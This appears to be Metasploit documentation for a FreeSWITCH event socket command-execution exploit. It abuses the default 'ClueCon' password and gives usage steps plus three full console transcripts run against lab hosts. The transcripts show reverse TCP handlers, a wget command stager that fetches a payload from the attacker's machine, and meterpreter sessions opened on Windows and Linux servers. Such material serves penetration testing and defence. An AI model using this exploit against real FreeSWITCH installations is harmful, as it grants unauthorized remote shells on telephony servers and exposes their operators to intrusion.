## Description

  This module uses the FreeSWITCH event socket interface
  to execute system commands using the `system` API command.

  The event socket service is enabled by default and listens
  on TCP port 8021 on the local network interface.


## Vulnerable Application

  [FreeSWITCH](https://freeswitch.com) is a free and open-source software defined
  telecommunications stack for real-time communication, WebRTC, telecommunications,
  video, and Voice over Internet Protocol.

  The [Event Socket](https://freeswitch.org/confluence/display/FREESWITCH/mod_event_socket)
  `mod_event_socket` is a TCP based interface to control FreeSWITCH and is enabled by default.

  The default values are to bind to 127.0.0.1 port 8021 and the default password is `ClueCon`.

  This module has been tested successfully on FreeSWITCH versions:

  1.6.10-17-726448d~44bit on FreeSWITCH-Deb8-TechPreview virtual machine;
  1.8.4~64bit on Ubuntu 19.04 (x64); and
  1.10.1~64bit on Windows 7 SP1 (EN) (x64).

  Source and Installers:

  * [Source Code Repository](https://github.com/signalwire/freeswitch)
  * [Installers](https://freeswitch.org/confluence/display/FREESWITCH/Installation)
  * [Virtual Machine](https://freeswitch.com/index.php/fs-virtual-machine/)


## Verification Steps

  1. Start `msfconsole`
  2. Do: `use exploit/multi/misc/freeswitch_event_socket_cmd_exec`
  3. Do: `set rhosts <ip>`
  4. Do: `set rport <port>` (default: `8021`)
  5. Do: `set password <password>` (default: `ClueCon`)
  6. Do: `set target <target>`
  7. Do: `run`
  8. You should get a session


## Options

  **Password**

  The password for the event socket. (default: `ClueCon`)


## Scenarios

### Windows PowerShell Target

```
msf5 > use exploit/multi/misc/freeswitch_event_socket_cmd_exec 
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > sessions -i 1 -C "portfwd add -l 1234 -p 8021 -r 127.0.0.1"
[*] Running 'portfwd add -l 1234 -p 8021 -r 127.0.0.1' on meterpreter session 1 (172.16.191.242)
[*] Local TCP relay created: :1234 <-> 127.0.0.1:8021
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set rport 1234
rport => 1234
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Unix (In-Memory)
   1   Linux (Dropper)
   2   PowerShell (In-Memory)
   3   Windows (In-Memory)
   4   Windows (Dropper)


msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set target 2
target => 2
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set lhost 172.16.191.165
lhost => 172.16.191.165
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > run

[*] Started reverse TCP handler on 172.16.191.165:4444 
[*] 127.0.0.1:1234 - Login success
[*] 127.0.0.1:1234 - Sending payload (310 bytes) ...
[*] Sending stage (180291 bytes) to 172.16.191.242
[*] Meterpreter session 2 opened (172.16.191.165:4444 -> 172.16.191.242:50706) at 2019-11-02 17:31:33 -0400

meterpreter > getuid
Server username: TEST\user
meterpreter > pwd
C:\Program Files\FreeSWITCH
meterpreter > sysinfo
Computer        : TEST
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > 
```


### Linux Dropper Target

```
msf5 > use exploit/multi/misc/freeswitch_event_socket_cmd_exec 
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > sessions -i 1 -C "portfwd add -l 1234 -p 8021 -r 127.0.0.1"
[*] Running 'portfwd add -l 1234 -p 8021 -r 127.0.0.1' on meterpreter session 1 (172.16.191.172)
[*] Local TCP relay created: :1234 <-> 127.0.0.1:8021
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set rport 1234
rport => 1234
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Unix (In-Memory)
   1   Linux (Dropper)
   2   PowerShell (In-Memory)
   3   Windows (In-Memory)
   4   Windows (Dropper)


msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set target 1
target => 1
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set lhost 172.16.191.165
lhost => 172.16.191.165
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set cmdstager::flavor wget
cmdstager::flavor => wget
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > run

[*] Started reverse TCP handler on 172.16.191.165:4444 
[*] 127.0.0.1:1234 - Login success
[*] 127.0.0.1:1234 - Sending payload (150 bytes) ...
[*] 127.0.0.1:1234 - Using URL: http://0.0.0.0:8080/WuWvURUHveqo5
[*] 127.0.0.1:1234 - Local IP: http://172.16.191.165:8080/WuWvURUHveqo5
[*] 127.0.0.1:1234 - Client 172.16.191.172 (Wget/1.16 (linux-gnu)) requested /WuWvURUHveqo5
[*] 127.0.0.1:1234 - Sending payload to 172.16.191.172 (Wget/1.16 (linux-gnu))
[*] Sending stage (985320 bytes) to 172.16.191.172
[*] 127.0.0.1:1234 - Command Stager progress - 100.00% done (120/120 bytes)
[*] Meterpreter session 2 opened (172.16.191.165:4444 -> 172.16.191.172:42478) at 2019-11-02 17:34:59 -0400
[*] 127.0.0.1:1234 - Server stopped.

meterpreter > getuid
Server username: uid=999, gid=999, euid=999, egid=999
meterpreter > pwd
/
meterpreter > sysinfo
Computer     : 172.16.191.172
OS           : Debian 8.5 (Linux 3.16.0-4-amd64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > 
```


### UNIX Generic Command Target

```
msf5 > use exploit/multi/misc/freeswitch_event_socket_cmd_exec 
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > sessions -i 1 -C "portfwd add -l 1234 -p 8021 -r 127.0.0.1"
[*] Running 'portfwd add -l 1234 -p 8021 -r 127.0.0.1' on meterpreter session 1 (172.16.191.172)
[*] Local TCP relay created: :1234 <-> 127.0.0.1:8021
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set rport 1234
rport => 1234
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Unix (In-Memory)
   1   Linux (Dropper)
   2   PowerShell (In-Memory)
   3   Windows (In-Memory)
   4   Windows (Dropper)


msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set target 0
target => 0
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set payload cmd/unix/generic 
payload => cmd/unix/generic
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set cmd "id; uname -a"
cmd => id; uname -a
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > set verbose true
verbose => true
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > run

[*] 127.0.0.1:1234 - Login success
[*] 127.0.0.1:1234 - Sending payload (12 bytes) ...
[*] 127.0.0.1:1234 - Response: Content-Type: api/response
Content-Length: 159

uid=999(freeswitch) gid=999(freeswitch) groups=999(freeswitch)
Linux freeswitch-vm 3.16.0-4-amd64 #1 SMP Debian 3.16.36-1+deb8u1 (2016-09-03) x86_64 GNU/Linux

[*] Exploit completed, but no session was created.
msf5 exploit(multi/misc/freeswitch_event_socket_cmd_exec) > 
```
